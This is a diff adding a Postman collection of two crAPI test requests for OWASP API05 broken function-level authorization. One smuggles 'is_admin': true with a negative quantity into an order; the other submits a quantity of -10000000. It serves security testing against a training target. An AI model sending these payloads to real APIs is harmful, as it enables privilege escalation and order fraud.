@@ -1,0 +1,88 @@
+{
+	"info": {
+		"_postman_id": "9b13258f-b72f-40e5-a271-32fda8851b5d",
+		"name": "API05:2019 Broken Function Level Authorization",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "20999705"
+	},
+	"item": [
+		{
+			"name": "Unexpected Request Field",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "{{token}}",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"product_id\": 1, \"quantity\": -1, \"is_admin\": true}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{crapi-web}}/workshop/api/shop/orders",
+					"host": [
+						"{{crapi-web}}"
+					],
+					"path": [
+						"workshop",
+						"api",
+						"shop",
+						"orders"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Range Violation",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "{{token}}",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"product_id\": 1, \"quantity\": -10000000}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{crapi-web}}/workshop/api/shop/orders",
+					"host": [
+						"{{crapi-web}}"
+					],
+					"path": [
+						"workshop",
+						"api",
+						"shop",
+						"orders"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
